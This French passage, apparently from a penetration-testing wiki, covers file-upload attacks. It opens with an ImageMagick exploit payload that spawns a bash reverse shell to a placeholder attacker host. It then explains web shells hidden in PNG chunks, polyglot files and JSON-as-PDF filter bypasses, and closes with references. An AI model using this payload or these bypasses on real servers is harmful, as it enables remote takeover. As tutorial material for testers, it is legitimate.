Uploadez ce contenu avec une extension d'image pour exploiter la vulnérabilité **(ImageMagick , 7.0.1-1)** (d'après l'[exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Intégration d'une PHP shell dans un PNG

L'insertion d'une PHP shell dans le chunk IDAT d'un fichier PNG peut contourner efficacement certaines opérations de traitement d'images. Les fonctions `imagecopyresized` et `imagecopyresampled` de PHP-GD sont particulièrement pertinentes dans ce contexte, car elles sont couramment utilisées pour redimensionner et rééchantillonner des images, respectivement. La capacité de la PHP shell intégrée à rester intacte malgré ces opérations est un avantage important pour certains cas d'utilisation.

Une exploration détaillée de cette technique, y compris sa méthodologie et ses applications potentielles, est fournie dans l'article suivant: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Cette ressource offre une compréhension complète du processus et de ses implications.

Plus d'informations : [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Les polyglot files servent d'outil unique en cybersécurité, agissant comme des caméléons pouvant exister valablement dans plusieurs formats de fichiers simultanément. Un exemple intrigant est un [GIFAR](https://en.wikipedia.org/wiki/Gifar), un hybride qui fonctionne à la fois comme un GIF et une archive RAR. De tels fichiers ne se limitent pas à ce duo ; des combinaisons comme GIF et JS ou PPT et JS sont également possibles.

L'utilité principale des polyglot files réside dans leur capacité à contourner des mesures de sécurité qui filtrent les fichiers en fonction de leur type. Il est courant que des applications n'autorisent que certains types de fichiers pour l'upload — comme JPEG, GIF ou DOC — pour réduire le risque posé par des formats potentiellement dangereux (par ex. JS, PHP ou fichiers Phar). Cependant, un polyglot, en respectant les critères structurels de plusieurs types de fichiers, peut passer furtivement outre ces restrictions.

Malgré leur adaptabilité, les polyglots rencontrent des limites. Par exemple, bien qu'un polyglot puisse incarner simultanément un fichier PHAR (PHp ARchive) et un JPEG, la réussite de son upload peut dépendre des politiques d'extensions de fichiers de la plateforme. Si le système est strict sur les extensions autorisées, la simple dualité structurelle d'un polyglot peut ne pas suffire à garantir son upload.

Plus d'informations : [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Téléverser des JSON valides comme s'il s'agissait d'un PDF

Comment éviter la détection du type de fichier en téléversant un fichier JSON valide même si cela n'est pas autorisé, en le faisant passer pour un fichier PDF (techniques tirées de **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**) :

- **`mmmagic` library** : Tant que les octets magiques `%PDF` sont dans les 1024 premiers octets, c'est considéré comme valide (voir exemple dans l'article).
- **`pdflib` library** : Ajoutez un faux format PDF dans un champ du JSON afin que la bibliothèque le considère comme un PDF (voir exemple dans l'article).
- **`file` binary** : Il peut lire jusqu'à 1048576 octets d'un fichier. Il suffit de créer un JSON plus grand que cela pour qu'il ne puisse pas analyser le contenu comme du JSON, puis insérer au début du JSON la partie initiale d'un vrai PDF et il pensera que c'est un PDF.

## Références

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [0xdf – HTB: Certificate (ZIP NUL-name and stacked ZIP parser confusion → PHP RCE)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../banners/hacktricks-training.md}}
